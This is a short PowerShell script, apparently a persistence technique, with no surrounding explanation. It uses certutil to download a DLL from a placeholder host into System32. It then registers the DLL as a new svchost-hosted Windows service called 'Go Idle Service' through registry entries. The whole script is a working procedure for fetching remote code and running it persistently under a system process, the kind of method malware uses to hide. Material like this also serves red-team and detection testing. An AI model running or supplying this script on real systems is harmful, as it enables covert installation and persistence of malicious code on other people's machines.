$serviceUrl = "http://domain.com/file.dll"
$servicePath = "$Env:SystemRoot\System32\idle_service.dll"
$serviceName = "idleService"
$serviceGroupName = "idle_service"
$serviceRegistyPath = "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\SvcHost"
$serviceParamsRegistyPath = "HKLM:\System\CurrentControlSet\services\$serviceName\Parameters"
certutil -urlcache -split -f $serviceUrl $servicePath
New-ItemProperty -Path $serviceRegistyPath -Name $serviceGroupName -Value $serviceName -PropertyType MultiString -Force | Out-Null
New-Service -Name $serviceName -BinaryPathName "%SystemRoot%\System32\svchost.exe -k $serviceGroupName" -DisplayName "Go Idle Service" -StartupType Manual -Description "This is a test service."
New-Item -Path $serviceParamsRegistyPath -Force | Out-Null
New-ItemProperty -Path $serviceParamsRegistyPath -Name "ServiceDll" -Value $servicePath -PropertyType ExpandString -Force | Out-Null